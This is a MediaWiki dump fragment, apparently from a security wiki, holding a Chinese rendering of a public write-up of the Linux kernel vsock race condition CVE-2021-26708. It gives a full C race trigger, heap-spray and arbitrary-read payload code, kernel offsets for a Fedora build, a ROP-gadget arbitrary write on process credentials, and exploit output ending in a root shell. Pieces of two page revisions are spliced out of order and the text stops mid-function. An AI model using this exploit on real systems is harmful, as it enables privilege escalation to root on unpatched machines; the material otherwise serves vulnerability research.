啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；
&lt;/div&gt;

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/div&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/div&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==尋找攻擊目標==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面是該漏洞如何從內存中提取這些指針:
&lt;/div&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==在 sk_buff 上實現 Use-after-free==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
我構建了以下步驟：
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
4.對vsock_sock執行任意讀取過程
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
6.對這個可能的sk_buff地址執行任意讀
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
9.對sk_buff內核地址進行任意釋放
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
11.使用recv()接收服務器套接字的網絡消息。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==通過skb_shared_info 進行任意寫==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/div&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/div&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面講講destructor_arg 回調:
&lt;/div&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/div&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==視頻==
&lt;/div&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>ix5uuc7aw8hxct9s3agvnjfgr56gy0n</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26708 Linux kernel before 5.10.13 特權提升漏洞/ja</title>
    <ns>0</ns>
    <id>1816</id>
    <revision>
      <id>2233</id>
      <timestamp>2021-05-05T05:28:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==脆弱性=="</comment>
      <origin>2233</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="27290" sha1="9baegq4s0ogee6ruj42ataz97luvne5" xml:space="preserve">&lt;languages  /&gt;
==脆弱性==

これらの脆弱性は、&lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;の誤ロックによる条件闘争が原因です。 これらの条件闘争は、VSOCKマルチトランスファーのサポートを追加した2019年11月のコミットで暗黙のうちに導入され、Linuxカーネルバージョン5.5-rc1にマージされました。

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt;和&lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt;在所有主要的GNU/Linux發行版中都作為內核模塊提供。當你為AF_VSOCK域創建一個套接字時，這些易受攻擊的模塊會自動加載。
&lt;/div&gt;
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;AF_VSOCK&lt;/code&gt;套接字的創建對非特權用戶來說是可用的，並不需要用戶名空間。
&lt;/div&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==內存破壞==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面詳細介紹CVE-2021-26708的利用，利用了&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;中的條件競爭，復現需要兩個線程，第一個線程調用&lt;code&gt;setsockopt()&lt;/code&gt;：
&lt;/div&gt;
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
第二個線程在&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;試圖獲取套接字鎖時改變虛擬套接字傳輸，通過重新連接虛擬套接字實現：
&lt;/div&gt;
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
為了處理虛擬套接字的&lt;code&gt;connect()&lt;/code&gt;，內核執行調用&lt;code&gt;vsock_assign_transport()&lt;/code&gt;的&lt;code&gt;vsock_stream_connect()&lt;/code&gt;。這個函數包含如下代碼：
&lt;/div&gt;
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;vsock_stream_connect()&lt;/code&gt;包含套接字鎖，並行線程中的&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;也嘗試獲取它，構成條件競爭。因此，當用不同的&lt;code&gt;svm_cid&lt;/code&gt;進行第二次&lt;code&gt;connect()&lt;/code&gt;時，&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;函數被調用。該函數執行&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;，釋放&lt;code&gt;vsock_sock.trans&lt;/code&gt;，&lt;code&gt;vsk-&gt;transport&lt;/code&gt;被設置為NULL。當&lt;code&gt;vsock_stream_connect()&lt;/code&gt;釋放套接字鎖時，&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;可以繼續執行。它調用&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;，隨後調用&lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;。這裡transport包含一個來自本地變量的過時的值，與&lt;code&gt;vsk-&gt;transport&lt;/code&gt;不匹配(本因被設為NULL)。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
內核執行&lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;，出現內存破壞：
&lt;/div&gt;
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡，vvs是指向內核內存的指針，它已經在&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;中被釋放。 &lt;code&gt;struct virtio_vsock_sock&lt;/code&gt;的大小為64字節，位於kmalloc-64塊緩存中。 buf_alloc字段類型為u32，位於偏移量40。 &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE是0xFFFFFFFFUL&lt;/code&gt;。 *val的值由攻擊者控制，它的四個最不重要的字節被寫入釋放的內存中。
&lt;/div&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==模糊測試==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
syzkaller fuzzer沒有辦法重現這個崩潰，於是我決定自行研究。但為什麼fuzzer會失敗呢？觀察&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;有所發現：
&lt;/div&gt;
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
只有當val與當前的buffer_size不同時，才會調用&lt;code&gt;notify_buffer_size()&lt;/code&gt;，也就是說&lt;code&gt;setsockopt()&lt;/code&gt;執行&lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;時，每次調用的size參數都應該不同。於是我構建了相關代碼:
&lt;/div&gt;
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡的size值取自&lt;code&gt;clock_gettime()&lt;/code&gt;返回的納秒數，每次都可能不同。原始的syzkaller不會這麼處理，因為在syzkaller生成 fuzzing輸入時，syscall參數的值被確定，執行時不會改變。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==四字節的力量==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡我選擇Fedora 33 Server作為研究目標，內核版本為5.10.11-200.fc33.x86_64，並決心繞過SMEP和SMAP。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
第一步，我開始研究穩定的堆噴射，該漏洞利用執行用戶空間的活動，使內核在釋放的virtio_vsock_sock的位置分配另一個64字節的對象。經過幾次實驗性嘗試後，確認釋放的virtio_vsock_sock被覆蓋，說明堆噴射是可行的。最終我找到了msgsnd() syscall。它在內核空間中創建了struct msg_msg，見pahole輸出：
&lt;/div&gt;
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
前面是消息頭，後面是消息數據。如果用戶空間中的struct msgbuf有一個16字節的mtext，則會在kmalloc-64塊緩存中創建相應的msg_msg。 4字節的write-after-free會破壞偏移量40的void *security指針。 msg_msg.security字段指向由lsm_msg_msg_alloc()分配的內核數據，當收到 msg_msg時，就會被security_msg_msg_free()釋放。因此，破壞security指針的前半部分，就能獲得 arbitrary free。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==內核信息洩露==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡使用了[https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683]相同的技巧。虛擬套接字的第二個connect()調用&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;，將&lt;code&gt;vsk-&gt;transport&lt;/code&gt;設置為NULL，使得&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;在內存崩潰後調用&lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;，出現內核告警：
&lt;/div&gt;
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過gdb調試，發現RCX寄存器包含了釋放的virtio_vsock_sock的內核地址，RBX寄存器包含了vsock_sock的內核地址。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==實現任意讀==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===從 arbitrary free 到 use-after-free===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
從洩露的內核地址釋放一個對象
執行堆噴，用受控數據覆蓋該對象
使用損壞的對象進行權限升級
內核實現的System V消息有限制最大值DATALEN_MSG，即PAGE_SIZE減去sizeof(struct msg_msg))。如果你發送了更大的消息，剩餘的消息會被保存在消息段的列表中。 msg_msg中包含struct msg_msgseg *next用於指向第一個段，size_t m_ts用於存儲大小。當進行覆蓋操作時，就可以把受控的值放在msg_msg.m_ts和msg_msg.next中：
&lt;/div&gt;

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
